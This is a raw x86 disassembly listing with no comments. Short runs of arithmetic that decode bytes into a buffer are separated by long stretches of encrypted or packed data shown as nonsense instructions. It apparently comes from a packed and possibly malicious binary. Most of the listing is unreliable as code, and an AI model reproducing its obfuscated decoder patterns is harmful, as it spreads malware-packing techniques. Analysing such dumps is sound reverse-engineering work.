  40a6ae:	mov    DWORD PTR [ebp-0x8],0x113c
  40a6b5:	mov    DWORD PTR [ebp-0xc],0x3d61
  40a6bc:	mov    DWORD PTR [ebp-0x10],0x16e9
  40a6c3:	mov    DWORD PTR [ebp-0x4],0x21aa
  40a6ca:	mov    eax,DWORD PTR [ebp-0x10]
  40a6cd:	or     eax,0x3611
  40a6d2:	add    eax,DWORD PTR [ebp-0xc]
  40a6d5:	mov    edx,DWORD PTR [ebp-0x8]
  40a6d8:	and    eax,edx
  40a6da:	mov    edx,ecx
  40a6dc:	sub    edx,eax
  40a6de:	mov    eax,DWORD PTR [ebp-0x4]
  40a6e1:	mov    esi,DWORD PTR ds:0x4226b8
  40a6e7:	mov    esi,DWORD PTR [esi+0x1cc]
  40a6ed:	add    eax,0x6772
  40a6f2:	or     eax,0x1f24
  40a6f7:	sub    eax,0x7046
  40a6fc:	xor    eax,0x497a
  40a701:	sub    esi,eax
  40a703:	mov    eax,DWORD PTR [ebp+0x8]
  40a706:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40a70d:	mov    BYTE PTR [esi+ecx*1],al
  40a710:	mov    eax,DWORD PTR [ebp-0x14]
  40a713:	mov    esi,DWORD PTR [ebp-0x18]
  40a716:	and    eax,0x2389
  40a71b:	xor    eax,0x695
  40a720:	xor    edx,edx
  40a722:	div    esi
  40a724:	lea    ecx,[ecx+eax*1-0x2413]
  40a72b:	mov    eax,DWORD PTR [ebp-0x1c]
  40a72e:	add    eax,DWORD PTR [ebp-0x20]
  40a731:	mov    edx,DWORD PTR [ebp-0x24]
  40a734:	and    eax,edx
  40a736:	mov    edx,DWORD PTR [ebp-0x28]
  40a739:	imul   eax,edx
  40a73c:	mov    edx,0xd0c8f
  40a741:	sub    edx,eax
  40a743:	cmp    ecx,edx
  40a745:	jbe    0x40a6ae
  40a74b:	push   0x2
  40a74d:	pop    eax
  40a74e:	mov    DWORD PTR [ebp-0x1c],eax
  40a751:	mov    DWORD PTR [ebp-0x20],ebx
  40a754:	mov    DWORD PTR [ebp-0x24],0x5
  40a75b:	mov    DWORD PTR [ebp-0x28],0x6686
  40a762:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40a769:	mov    DWORD PTR [ebp-0x4],eax
  40a76c:	mov    DWORD PTR [ebp+0x8],0x739a
  40a773:	mov    DWORD PTR [ebp-0xc],0xf3a
  40a77a:	xor    edx,edx
  40a77c:	mov    DWORD PTR [ebp-0x10],0x429
  40a783:	mov    eax,DWORD PTR [ebp-0x28]
  40a786:	mov    ecx,DWORD PTR [ebp-0x24]
  40a789:	sub    eax,0x175c
  40a78e:	div    ecx
  40a790:	mov    ecx,DWORD PTR [ebp-0x20]
  40a793:	xor    edx,edx
  40a795:	mov    edi,0x4db5
  40a79a:	div    ecx
  40a79c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a79f:	xor    edx,edx
  40a7a1:	div    ecx
  40a7a3:	xor    edx,edx
  40a7a5:	mov    ecx,eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	imul   ecx,ecx,0x2e01
  40a7b0:	mov    esi,DWORD PTR [ebp-0x4]
  40a7b3:	add    eax,edi
  40a7b5:	div    esi
  40a7b7:	mov    edx,DWORD PTR [ebp-0x8]
  40a7ba:	mov    esi,0x940a7
  40a7bf:	sub    ecx,0x16bea86
  40a7c5:	jmp    0x40aa5c
  40a7ca:	lds    ecx,FWORD PTR [ebp+0x709870ff]
  40a7d0:	mov    dh,0xb7
  40a7d2:	and    dh,BYTE PTR [esi+ecx*1]
  40a7d5:	sahf   
  40a7d6:	cs mov bl,0xb6
  40a7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7da:	(bad)  
  40a7db:	lahf   
  40a7dc:	mov    esi,0xbec2a9be
  40a7e1:	mov    esi,0x91ac9f57
  40a7e6:	popf   
  40a7e7:	inc    eax
  40a7e8:	cmp    ch,ah
  40a7ea:	ficomp WORD PTR [eax]
  40a7ec:	shl    BYTE PTR [ebx+0x7a],1
  40a7ef:	mov    dl,0xfa
  40a7f1:	cwde   
  40a7f2:	aad    0x46
  40a7f4:	cld    
  40a7f5:	dec    edx
  40a7f6:	cmp    DWORD PTR [ebx-0x66],edi
  40a7f9:	icebp  
  40a7fa:	fst    QWORD PTR [edi]
  40a7fc:	sbb    ecx,esp
  40a7fe:	cmp    BYTE PTR [esi],dh
  40a800:	scas   al,BYTE PTR es:[edi]
  40a801:	sbb    DWORD PTR [edi],ebp
  40a803:	xlat   BYTE PTR gs:[ebx]
  40a805:	icebp  
  40a806:	test   DWORD PTR [ebp-0x3b1a447e],ebp
  40a80c:	fsubrp st(0),st
  40a80e:	jae    0x40a7ab
  40a810:	jp     0x40a7c8
  40a812:	int    0xd8
  40a814:	in     eax,0x99
  40a816:	lock (bad) 
  40a819:	ror    BYTE PTR [ecx+0x7e40a7aa],1
  40a81f:	call   0x72c0:0x18110b24
  40a826:	test   BYTE PTR [edx],ch
  40a828:	add    al,0x10
  40a82a:	cwde   
  40a82b:	imul   esp,eax,0x4a
  40a82e:	jmp    0x40a87b
  40a830:	jb     0x40a7f6
  40a832:	ficom  DWORD PTR [ebp-0x1]
  40a835:	es lock mov dh,0xf8
  40a839:	jl     0x40a82a
  40a83b:	pusha  
  40a83c:	out    dx,al
  40a83d:	sbb    BYTE PTR [ebp-0x4d],ah
  40a840:	inc    esp
  40a842:	sub    eax,0x97df9fcb
  40a847:	mov    edi,DWORD PTR [ebp+eax*2+0x7d]
  40a84b:	ins    DWORD PTR es:[edi],dx
  40a84c:	sahf   
  40a84d:	xchg   esi,eax
  40a84e:	fist   WORD PTR [ebx+0xc]
  40a851:	lock mov BYTE PTR [edx],dl
  40a854:	dec    esp
  40a855:	sbb    al,0xa8
  40a857:	iret   
  40a858:	mov    dh,0xce
  40a85a:	jno    0x40a852
  40a85c:	dec    esp
  40a85d:	aas    
  40a85e:	(bad)  
  40a860:	mov    ecx,DWORD PTR [ebx-0x26]
  40a863:	int3   
  40a864:	aas    
  40a865:	xchg   esi,edx
  40a867:	stos   DWORD PTR es:[edi],eax
  40a868:	mov    edx,0x3e7cc2d0
  40a86d:	push   es
  40a86e:	mov    ecx,0x2f647188
  40a873:	in     al,dx
  40a874:	dec    ebp
  40a875:	adc    BYTE PTR [edi],ch
  40a877:	int    0xe9
  40a879:	push   eax
  40a87a:	push   eax
  40a87b:	icebp  
  40a87c:	mov    DWORD PTR [edi+0xa],esi
  40a87f:	dec    edx
  40a880:	xor    BYTE PTR [ebx+eax*8+0x37ab3d40],0x79
  40a888:	push   ss
  40a889:	mov    ebp,0x45084f16
  40a88e:	inc    edi
  40a88f:	xor    eax,DWORD PTR [esi-0x61]
  40a892:	and    bh,BYTE PTR ds:[ebp+0x2b]
  40a896:	cmp    edi,DWORD PTR [edx-0x1f]
  40a899:	loope  0x40a84a
  40a89b:	icebp  
  40a89c:	hlt    
  40a89d:	xor    bh,cl
  40a89f:	data16 or al,0x6c
  40a8a2:	sub    dl,BYTE PTR [ecx+0x44]
  40a8a5:	jne    0x40a895
  40a8a7:	pushf  
  40a8a8:	xchg   ebp,eax
  40a8a9:	ret    0xbfb5
  40a8ac:	add    DWORD PTR [edi-0x747c15dd],esp
  40a8b2:	dec    ebp
  40a8b3:	loopne 0x40a929
  40a8b5:	loop   0x40a8b3
  40a8b7:	aad    0xc7
  40a8b9:	inc    esi
  40a8ba:	or     DWORD PTR [ebx+0x7dc3ff85],eax
  40a8c0:	inc    edi
  40a8c1:	hlt    
  40a8c2:	jl     0x40a929
  40a8c4:	iret   
  40a8c5:	addr16 adc al,0x5e
  40a8c8:	pop    ebx
  40a8c9:	lds    edi,FWORD PTR [esi+edx*4-0x26]
  40a8cd:	loope  0x40a898
  40a8cf:	int3   
  40a8d0:	ds pop ebx
  40a8d2:	xlat   BYTE PTR ds:[ebx]
  40a8d3:	aaa    
  40a8d4:	test   DWORD PTR [edi],ecx
  40a8d6:	outs   dx,DWORD PTR ds:[esi]
  40a8d7:	add    eax,0x2d84dc16
  40a8dc:	cmp    eax,0x52c4568e
  40a8e1:	mov    edi,0xfb33d24a
  40a8e6:	mov    BYTE PTR [eax],cl
  40a8e8:	shl    DWORD PTR [ecx+0x404a820],1
  40a8ee:	(bad)  
  40a8f0:	outs   dx,DWORD PTR ds:[esi]
  40a8f1:	jno    0x40a88a
  40a8f3:	dec    edi
  40a8f4:	jne    0x40a888
  40a8f6:	rol    BYTE PTR [edi-0x4b127e78],1
  40a8fc:	test   al,0xed
  40a8fe:	(bad)  
  40a8ff:	adc    ecx,DWORD PTR [edi-0x73]
  40a902:	push   cs
  40a903:	test   DWORD PTR [ebx+0x18155607],ebx
  40a909:	bound  ebx,QWORD PTR [edi+0x4fabec4]
  40a90f:	imul   eax,DWORD PTR ds:0x7c1df9ee,0x66593661
  40a919:	retf   0xe66f
  40a91c:	xor    edx,DWORD PTR [ebx]
  40a91e:	sub    al,BYTE PTR [ebx-0x1b8dab89]
  40a924:	lock add esi,esi
  40a927:	fisttp WORD PTR ds:[ecx]
  40a92a:	pop    ds
  40a92b:	mov    WORD PTR [esi],gs
  40a92d:	sbb    BYTE PTR [edi-0x5bdbd0fb],0xe
  40a934:	jmp    0x4ea3:0x68240fc2
  40a93b:	fnsave [ecx]
  40a93d:	xor    cl,dl
  40a93f:	adc    DWORD PTR [esi-0x1745887a],ebp
  40a945:	cmp    al,0xb3
  40a947:	mov    ebp,0x7f5927a
  40a94c:	(bad)  
  40a94d:	outs   dx,BYTE PTR ds:[esi]
  40a94e:	shr    DWORD PTR [ebx+ecx*2],0x9a
  40a952:	sub    DWORD PTR [ebx-0x79d6efa6],edi
  40a958:	aaa    
  40a959:	aaa    
  40a95a:	out    0x33,al
  40a95c:	mov    bl,0x6c
  40a95e:	push   edi
  40a95f:	mov    ch,0xdb
  40a961:	cmp    al,0x1
  40a963:	es add eax,0xf5ebba93
  40a969:	push   eax
  40a96a:	xchg   ecx,eax
  40a96b:	lods   eax,DWORD PTR ds:[esi]
  40a96c:	jmp    0xf40443dc
  40a971:	inc    esi
  40a972:	fwait
  40a973:	repnz clc 
  40a975:	lahf   
  40a976:	ds jno 0x40a9af
  40a979:	iret   
  40a97a:	mov    WORD PTR [esi+0x4dbaf887],es
  40a980:	js     0x40a92a
  40a982:	call   FWORD PTR [edx+0x4a]
  40a985:	push   ebp
  40a986:	add    al,0x59
  40a989:	adc    BYTE PTR [eax],bh
  40a98b:	stos   DWORD PTR es:[edi],eax
  40a98c:	popf   
  40a98d:	nop
  40a98e:	rcl    cl,1
  40a990:	mov    al,ds:0x5e5eea96
  40a995:	inc    edx
  40a996:	pop    ebx
  40a997:	ret    
  40a998:	dec    edx
  40a999:	mov    DWORD PTR [esi+0x77],esi
  40a99c:	loop   0x40a9f0
  40a99e:	ds nop
  40a9a0:	mov    ah,0xbd
  40a9a2:	es scas eax,DWORD PTR es:[edi]
  40a9a4:	jmp    0x413e:0x105ea471
  40a9ab:	js     0x40a9c3
  40a9ad:	das    
  40a9ae:	add    DWORD PTR [eax+0x3caa4796],edi
  40a9b4:	mov    ebx,0xbbd90508
  40a9b9:	jl     0x40a9cd
  40a9bb:	test   al,0xfa
  40a9bd:	push   esi
  40a9be:	inc    eax
  40a9bf:	push   ebx
  40a9c0:	lock test al,0xb6
  40a9c3:	sub    DWORD PTR [ebx-0x55],edx
  40a9c6:	sbb    dh,bl
  40a9c8:	je     0x40aa20
  40a9ca:	push   cs
  40a9cb:	or     ah,dl
  40a9cd:	inc    eax
  40a9ce:	icebp  
  40a9cf:	outs   dx,BYTE PTR ds:[esi]
  40a9d0:	dec    esp
  40a9d1:	arpl   WORD PTR [edx-0x397b20dd],di
  40a9d7:	dec    ebp
  40a9d8:	cmp    ebp,eax
  40a9da:	mov    eax,ds:0xaa02986a
  40a9df:	fs call 0xed5bab41
  40a9e5:	fwait
  40a9e6:	jmp    0x6d18:0x8fe0cdac
  40a9ed:	stos   DWORD PTR es:[edi],eax
  40a9ee:	dec    esi
  40a9ef:	sub    al,0x0
  40a9f1:	outs   dx,BYTE PTR ds:[esi]
  40a9f2:	shl    DWORD PTR ds:0x5cebfa94,0xb4
  40a9f9:	call   0xf5eb:0xd2d30c6a
  40aa00:	jecxz  0x40a9b4
  40aa02:	add    bl,BYTE PTR [ebp+0x64]
  40aa05:	enter  0x5c09,0x83
  40aa09:	hlt    
  40aa0a:	stos   DWORD PTR es:[edi],eax
  40aa0b:	mov    ds:0x45287cf9,eax
  40aa10:	jge    0x40a9c7
  40aa12:	pushf  
  40aa13:	in     al,dx
  40aa14:	mov    esi,0xa8362866
  40aa19:	mov    al,0xa1
  40aa1b:	fnsave [edx]
  40aa1d:	fidiv  DWORD PTR [esi+0x58c426cb]
  40aa23:	in     al,dx
  40aa24:	xor    esp,esp
  40aa26:	dec    ebp
  40aa27:	sub    ecx,edx
  40aa29:	xchg   ch,cl
  40aa2b:	dec    eax
  40aa2c:	ficom  DWORD PTR [ebx]
  40aa2e:	add    esi,DWORD PTR [edi-0x47]
  40aa31:	retf   
  40aa32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa33:	mov    ah,0xc
  40aa35:	cmc    
  40aa36:	repz aaa 
  40aa38:	jns    0x40aa27
  40aa3a:	and    ebp,DWORD PTR [ecx]
  40aa3c:	mov    ch,0xda
  40aa3e:	mov    eax,0xe2631768
  40aa43:	imul   edx,DWORD PTR [ebp-0x37],0xfbecd8dc
  40aa4a:	add    BYTE PTR [esi+esi*1-0x4dc603f],al
  40aa51:	pop    esp
  40aa52:	push   ss
  40aa53:	shl    BYTE PTR [eax+0x121e45b1],1
  40aa59:	jl     0x40aa04
  40aa5b:	mov    al,0x2b
  40aa5d:	ret    0xd233
  40aa60:	div    esi
  40aa62:	mov    esi,0xdbd
  40aa67:	add    eax,esi
  40aa69:	cmp    ecx,eax
  40aa6b:	jae    0x40b05a
  40aa71:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40aa78:	mov    DWORD PTR [ebp-0x20],0x383e
  40aa7f:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40aa86:	mov    DWORD PTR [ebp-0x14],0x13cd
  40aa8d:	jmp    0x40ad24
  40aa92:	popa   
  40aa93:	clc    
  40aa94:	jnp    0x40aae9
  40aa96:	jl     0x40aaec
  40aa98:	imul   edi,eax,0x9e64741c
  40aa9e:	stc    
  40aa9f:	adc    BYTE PTR [eax-0x6e],bh
  40aaa2:	jmp    0xbec2:0xa9bebea5
  40aaa9:	mov    esi,0xda9d3368
  40aaae:	push   0x1ffe6962
  40aab3:	stc    
  40aab4:	cmc    
  40aab5:	mul    BYTE PTR [ebp-0x5]
  40aab8:	dec    ebp
  40aab9:	bound  ebp,QWORD PTR [ebx]
  40aabb:	enter  0x511a,0x81
  40aabf:	or     BYTE PTR [esi-0x2b7236b6],ch
  40aac5:	fdivr  DWORD PTR [edx+0x29763fe7]
  40aacb:	jg     0x40aa4e
  40aacd:	ja     0x40aa85
  40aacf:	aad    0x2a
  40aad1:	std    
  40aad2:	retf   0xd278
  40aad5:	mov    ebx,0x96066865
  40aada:	sub    esi,DWORD PTR [esp+ecx*1]
  40aadd:	test   BYTE PTR [esi*4+0x2e56dfdc],ch
  40aae4:	adc    al,0x97
  40aae6:	hlt    
  40aae7:	dec    BYTE PTR [esp+ecx*4+0x45]
  40aaeb:	test   al,0xbe
  40aaed:	jg     0x40aafe
  40aaef:	jne    0x40aacd
  40aaf1:	int    0x1
  40aaf3:	cmp    DWORD PTR [edx-0x63],esi
  40aaf6:	maskmovq mm4,(bad)
  40aaf7:	mul    DWORD PTR [esi+0x4a]
  40aafa:	pop    edx
  40aafb:	int    0x55
  40aafd:	fcmovu st,st(7)
  40aaff:	scas   eax,DWORD PTR es:[edi]
  40ab00:	out    0x15,eax
  40ab02:	in     eax,dx
  40ab03:	(bad)  
  40ab05:	fisubr DWORD PTR [ebp+ebx*8+0x374332c0]
  40ab0c:	das    
  40ab0d:	sbb    DWORD PTR [ebp-0x3dda96be],eax
  40ab13:	dec    ebp
  40ab14:	xor    eax,0x11e31811
  40ab19:	dec    esp
  40ab1a:	mov    bl,0xce
  40ab1c:	ret    0x48b7
  40ab1f:	xor    edx,DWORD PTR [ebx+0x66c35ff3]
  40ab25:	ins    DWORD PTR es:[edi],dx
  40ab26:	push   es
  40ab27:	xchg   ch,ah
  40ab29:	push   es
  40ab2a:	call   0xc85a5465
  40ab2f:	out    dx,eax
  40ab30:	pusha  
  40ab31:	enter  0x7e2e,0xbc
  40ab35:	jg     0x40ab06
  40ab37:	xchg   edx,eax
  40ab38:	mov    eax,ds:0x70137769
  40ab3d:	ja     0x40ab70
  40ab3f:	and    BYTE PTR [esi-0x632040be],ch
  40ab45:	(bad)  
  40ab46:	out    0x8e,al
  40ab48:	loopne 0x40ab0b
  40ab4a:	frstor [edx]
  40ab4c:	and    BYTE PTR [edi-0x4ec5ac2f],bh
  40ab52:	sub    BYTE PTR [ebp+0x7f],dh
  40ab55:	test   al,0x94
  40ab57:	jg     0xcc818479
  40ab5d:	jnp    0x40ab66
  40ab5f:	inc    ecx
  40ab60:	bound  ebx,QWORD PTR [ecx+0x6c757b83]
  40ab66:	test   DWORD PTR [ecx+0x4faa7b94],0x3a45c53e
  40ab70:	aaa    
  40ab71:	mov    BYTE PTR [esi+0x26514bf9],dh
  40ab77:	jb     0x40ab39
  40ab79:	jno    0x40ab54
  40ab7b:	xor    eax,0xc29547c0
  40ab80:	dec    edx
  40ab81:	(bad)  
  40ab82:	fild   QWORD PTR [esi]
  40ab84:	sub    eax,0xefb2b16f
  40ab89:	repz cdq 
  40ab8b:	sub    DWORD PTR [ebx],edx
  40ab8d:	and    BYTE PTR [edx+0x4c],bl
  40ab90:	fistp  QWORD PTR [eax-0x7183a96f]
  40ab96:	mov    edi,DWORD PTR [edx+0x127d3c97]
  40ab9c:	mov    al,ds:0x5d458cae
  40aba1:	jbe    0x40aba7
  40aba3:	mov    bl,0x9f
  40aba5:	inc    esi
  40aba6:	jns    0x40aba2
  40aba8:	jnp    0x40ac00
  40abaa:	mov    ah,0x48
  40abac:	adc    al,al
  40abae:	sub    eax,0x6f4dff1c
  40abb3:	push   es
  40abb4:	xor    bh,0x25
  40abb7:	(bad)  
  40abb8:	ss lahf 
  40abba:	stc    
  40abbb:	jl     0x40abcc
  40abbd:	xlat   BYTE PTR ds:[ebx]
  40abbe:	(bad)  
  40abbf:	push   0x328602fc
  40abc4:	cmp    al,0xb2
  40abc6:	lods   eax,DWORD PTR ds:[esi]
  40abc7:	or     BYTE PTR [esi+eiz*1+0x3f4f7fe5],ch
  40abce:	xor    bl,BYTE PTR [edi]
  40abd0:	(bad)  
  40abd1:	jbe    0x40ac01
  40abd3:	xor    eax,0x11edaba5
  40abd8:	bound  esi,QWORD PTR [eax-0x4a]
  40abdb:	stc    
  40abdc:	dec    ecx
  40abdd:	add    bh,BYTE PTR [edx+0x73]
  40abe0:	mov    esi,0x40cd3c1b
  40abe5:	adc    eax,0xd49856c0
  40abea:	mov    eax,ds:0x88be878d
  40abef:	jg     0x40ac44
  40abf1:	out    0xe1,al
  40abf3:	ja     0x40ac48
  40abf5:	cmp    al,0x97
  40abf7:	jmp    0x149e89a5
  40abfc:	outs   dx,BYTE PTR ds:[esi]
  40abfd:	mov    cl,0x77
  40abff:	repz arpl WORD PTR [eax+eiz*2],ax
  40ac03:	popa   
  40ac04:	loopne 0x40ac3b
  40ac06:	sbb    al,0xae
  40ac08:	mov    eax,0x8851fb0
  40ac0d:	je     0x40ac04
  40ac0f:	stc    
  40ac10:	jbe    0x40ac24
  40ac12:	fwait
  40ac13:	popf   
  40ac14:	stc    
  40ac15:	mov    esp,0x9d275448
  40ac1a:	ss mov cl,0xb0
  40ac1d:	pop    edi
  40ac1e:	and    BYTE PTR [edx],ah
  40ac20:	dec    edx
  40ac21:	scas   al,BYTE PTR es:[edi]
  40ac22:	retf   0xea71
  40ac25:	dec    esp
  40ac26:	xchg   ebp,eax
  40ac27:	fmul   QWORD PTR [ebx]
  40ac29:	mov    dh,0x2b
  40ac2b:	sub    ecx,DWORD PTR [ecx-0x64219376]
  40ac31:	call   0xc194:0xc3c996
  40ac38:	dec    edx
  40ac39:	cli    
  40ac3a:	add    DWORD PTR [ecx+0x2c],edi
  40ac3d:	mov    WORD PTR ds:0x492f744d,?
  40ac43:	adc    al,0x4e
  40ac45:	ficomp WORD PTR [edi-0x4f]
  40ac48:	push   edi
  40ac49:	pop    eax
  40ac4a:	pop    ss
  40ac4b:	jp     0x40acc4
  40ac4d:	test   eax,0xd8df7663
  40ac52:	cmp    DWORD PTR [esi+ebp*4],0x433e6bcd
  40ac59:	outs   dx,DWORD PTR ds:[esi]
  40ac5a:	mov    WORD PTR ds:0x8c05373c,cs
  40ac60:	sub    esi,DWORD PTR [esi-0x1e]
  40ac63:	jae    0x40ac59
  40ac65:	loopne 0x40ac65
  40ac67:	jmp    0x1f4f:0xccd7a62e
  40ac6e:	jecxz  0x40ac41
  40ac70:	jmp    0xbdcf:0x1e3c1237
  40ac77:	punpcklwd mm5,DWORD PTR ds:0x6eb95e19
  40ac7e:	aas    
  40ac7f:	pop    ecx
  40ac80:	jp     0x40acd0
  40ac82:	call   0x74a67e15
  40ac87:	pusha  
  40ac88:	fidivr DWORD PTR [ebx+0x76]
  40ac8b:	jb     0x40ac46
  40ac8d:	les    esi,FWORD PTR [eax+eiz*4]
  40ac90:	add    al,0x8d
  40ac92:	and    ah,BYTE PTR [edx-0x778a0f57]
  40ac98:	inc    ecx
  40ac99:	addr16 push edx
  40ac9b:	loope  0x40acf0
  40ac9d:	mov    ah,0xcd
  40ac9f:	push   ecx
  40aca0:	xchg   BYTE PTR [ebp+eiz*1-0x70],ch
  40aca4:	jno    0x40acd8
  40aca6:	(bad)  
  40aca7:	pop    esp
  40aca8:	pop    esi
  40aca9:	push   es
  40acaa:	dec    esp
  40acab:	daa    
  40acac:	test   BYTE PTR [eax-0x28],cl
  40acaf:	or     DWORD PTR [ebp-0x674168b0],edi
  40acb5:	and    ebx,DWORD PTR [ecx]
  40acb7:	cld    
  40acb8:	fxch   st(5)
  40acba:	sbb    ebp,DWORD PTR [eax+0x18]
  40acbd:	mov    ds:0x2a94822b,eax
  40acc2:	call   0x710d:0x68fb1a22
  40acc9:	out    dx,eax
  40acca:	sub    dl,BYTE PTR [eax]
  40accc:	mov    ecx,0xe7bb5e79
  40acd1:	out    0x26,eax
  40acd3:	dec    ebx
  40acd4:	jecxz  0x40ad09
  40acd6:	test   al,0xd
  40acd8:	jg     0x40ad39
  40acda:	xor    DWORD PTR [eax],ebx
  40acdc:	add    BYTE PTR [ebp+0x54b4dda3],0x33
  40ace3:	jne    0x40ad4a
  40ace5:	mov    bl,0x44
  40ace7:	jg     0x40ad4f
  40ace9:	mov    esi,0x1be1860f
  40acee:	jp     0x40acdf
  40acf0:	adc    eax,ebp
  40acf2:	mov    WORD PTR [edi+0x7a5fa1db],cs
  40acf8:	ins    BYTE PTR es:[edi],dx
  40acf9:	lods   eax,DWORD PTR ds:[esi]
  40acfa:	repnz cmp DWORD PTR [edi+0x6bd3201c],0xaa9cfbeb
  40ad05:	push   ds
  40ad06:	sub    al,0x4e
  40ad08:	les    edi,FWORD PTR [edi]
  40ad0a:	mov    ch,0x54
  40ad0c:	aaa    
  40ad0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad0e:	xchg   edi,eax
  40ad0f:	das    
  40ad10:	pusha  
  40ad11:	inc    esp
  40ad12:	or     edx,ebp
  40ad14:	sti    
  40ad15:	mov    eax,ds:0xd2c79e9
  40ad1a:	push   edi
  40ad1b:	mov    dl,BYTE PTR [ecx+0x1d2e2ffa]
  40ad21:	and    BYTE PTR [ebx-0x382dcc38],dl
  40ad27:	inc    ebp
  40ad28:	call   0x40aeb4
  40ad2d:	mov    DWORD PTR [ebp-0x28],0x3224
  40ad34:	mov    eax,DWORD PTR [ebp-0x28]
  40ad37:	push   0x6
  40ad39:	pop    ebx
  40ad3a:	div    ebx
  40ad3c:	mov    edx,eax
  40ad3e:	mov    eax,ds:0x4226b8
  40ad43:	mov    eax,DWORD PTR [eax+0x1d0]
  40ad49:	sub    eax,edx
  40ad4b:	mov    edx,DWORD PTR [ebp-0x24]
  40ad4e:	jmp    0x40afe5
  40ad53:	dec    esp
  40ad54:	sub    BYTE PTR [ebp-0x49],ah
  40ad57:	test   eax,0xb93c9cb8
  40ad5c:	and    BYTE PTR [esi-0x266bfb70],bl
  40ad62:	jecxz  0x40ad39
  40ad64:	test   eax,0xc2a9bebe
  40ad69:	mov    esi,0x371ffdbe
  40ad6e:	xchg   esp,eax
  40ad6f:	adc    BYTE PTR [ebx+0x4dbd0a92],bl
  40ad75:	cld    
  40ad76:	mov    ebp,0xc09eacb
  40ad7b:	mov    bl,0x6b
  40ad7d:	loope  0x40adbc
  40ad7f:	ss repnz push 0xef21000a
  40ad86:	aad    0xd1
  40ad88:	or     al,0x7b
  40ad8a:	ror    BYTE PTR [ecx],cl
  40ad8c:	mov    dh,0xe7
  40ad8e:	mov    al,0xe9
  40ad90:	push   ss
  40ad91:	jmp    0x69a2:0xb8d3ca14
  40ad98:	adc    bh,al
  40ad9a:	or     eax,0x7fefade3
  40ad9f:	cmp    dh,ch
  40ada1:	jmp    0xc13ca4d1
  40ada6:	jne    0x40ad44
  40ada8:	mov    edi,0x89b81607
  40adad:	and    esi,DWORD PTR [esi-0x6c5d8cae]
  40adb3:	or     al,0xaf
  40adb5:	sar    BYTE PTR [ebx],0x84
  40adb8:	pop    ss
  40adb9:	cmp    DWORD PTR [eax-0x66f9095],esp
  40adbf:	sti    
  40adc0:	test   al,0x8b
  40adc2:	and    cl,ah
  40adc4:	mov    bl,0x56
  40adc6:	dec    ebx
  40adc7:	call   0xc8ad:0xf59315fb
  40adce:	or     eax,0xf8c66616
  40add3:	mov    DWORD PTR [ebx],edi
  40add5:	data16 mov bh,0x6a
  40add8:	push   0x7c
  40adda:	loope  0x40ae43
  40addc:	inc    eax
  40addd:	ss mov ebx,0x6938745c
  40ade3:	sbb    al,0x5b
  40ade5:	cld    
  40ade6:	and    ch,BYTE PTR [esi+0x57]
  40ade9:	pop    es
  40adea:	test   eax,0xf6b29f9a
  40adef:	es inc esp
  40adf1:	stc    
  40adf2:	inc    eax
  40adf3:	inc    edx
  40adf4:	jbe    0x40ae14
  40adf6:	ja     0x40ae33
  40adf8:	pop    eax
  40adf9:	inc    edx
  40adfa:	out    dx,al
  40adfb:	cmp    ah,BYTE PTR [edi-0x2d]
  40adfe:	loop   0x40ae63
  40ae00:	ficom  DWORD PTR [esi+ebx*1]
  40ae03:	jnp    0x40adee
  40ae05:	mov    ds:0x4d80e33d,eax
  40ae0a:	mov    ds:0x7edca805,al
  40ae0f:	rol    BYTE PTR gs:[edi-0x252ab995],0x91
  40ae17:	aas    
  40ae18:	push   cs
  40ae19:	xchg   DWORD PTR [ebx],ecx
  40ae1b:	push   ebx
  40ae1c:	mov    DWORD PTR [edi-0x3e38ccbd],esi
  40ae22:	mov    eax,ds:0x5aaab895
  40ae27:	push   sp
  40ae29:	add    esi,DWORD PTR [edx-0x6c]
  40ae2c:	sbb    BYTE PTR [eax],ch
  40ae2e:	mov    ah,BYTE PTR [ebx+0x2d135edb]
  40ae34:	sti    
  40ae35:	push   edx
  40ae36:	jp     0x40ae69
  40ae38:	sub    DWORD PTR [edx+0x522259f4],0x44ebda28
  40ae42:	xchg   ebx,eax
  40ae43:	add    DWORD PTR [eax],0xffffffa1
  40ae46:	sub    cl,ch
  40ae48:	mov    BYTE PTR [edx],ch
  40ae4a:	cmp    DWORD PTR [ecx-0x71],ecx
  40ae4d:	imul   esi,DWORD PTR [esi],0xe
  40ae50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae51:	inc    edi
  40ae52:	push   ds
  40ae53:	hlt    
  40ae54:	das    
  40ae55:	jb     0x40aeb7
  40ae57:	ins    DWORD PTR es:[edi],dx
  40ae58:	jmp    DWORD PTR [esi]
  40ae5a:	(bad)  
  40ae5b:	idiv   BYTE PTR [eax-0x5f561819]
  40ae61:	loop   0x40adf4
  40ae63:	fs adc eax,ebx
  40ae66:	ss pop ecx
  40ae68:	jae    0x40ae35
  40ae6a:	outs   dx,DWORD PTR ds:[esi]
  40ae6b:	fs popa 
  40ae6d:	dec    esp
  40ae6e:	fcmovne st,st(4)
  40ae70:	add    DWORD PTR [ebx],esp
  40ae72:	xchg   edx,eax
  40ae73:	mov    edx,0xef926a3f
  40ae78:	stc    
  40ae79:	cdq    
  40ae7a:	dec    ebx
  40ae7b:	push   ds
  40ae7c:	dec    edx
  40ae7d:	rcl    BYTE PTR [edx-0x78ed5305],cl
  40ae83:	shr    DWORD PTR [ecx-0x3091b01b],cl
  40ae89:	dec    esp
  40ae8a:	pop    eax
  40ae8b:	aam    0xca
  40ae8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae8e:	sbb    eax,0x5b3dfb4a
  40ae93:	(bad)  
  40ae94:	dec    ecx
  40ae95:	or     ebx,DWORD PTR fs:[ebx+0x24]
  40ae99:	push   0xf6b3dfe5
  40ae9e:	and    eax,0x40089639
  40aea3:	aad    0x8b
  40aea5:	inc    edx
  40aea6:	or     ch,BYTE PTR [eax+0x26]
  40aea9:	out    dx,eax
  40aeaa:	dec    ecx
  40aeab:	sbb    al,0x76
  40aead:	stos   BYTE PTR es:[edi],al
  40aeae:	cmp    al,0x88
  40aeb0:	outs   dx,BYTE PTR ds:[esi]
  40aeb1:	daa    
  40aeb2:	mov    ds:0xc2f4a5ae,eax
